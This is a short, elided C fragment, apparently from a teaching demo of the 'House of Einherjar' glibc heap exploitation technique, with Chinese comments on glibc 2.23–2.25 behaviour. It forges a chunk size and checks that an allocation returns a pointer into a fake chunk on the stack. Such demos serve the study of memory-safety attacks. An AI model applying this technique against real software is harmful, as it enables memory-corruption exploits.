...
int main()
{
	...
	fake_chunk[0] = 0x00; // 2.23~2.25 还没有 2.26 引入的 prev_size 一致性检查，这个字段不参与本链。
	fake_chunk[1] = 0x00; // 旧路径的 backward consolidation 不依赖初始的 fake size，后面会按真实距离覆盖。
	...
	*(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;
	...
	assert(d == (uint8_t *)&fake_chunk[2]);
	puts("[+] Einherjar：返回栈伪块");
}
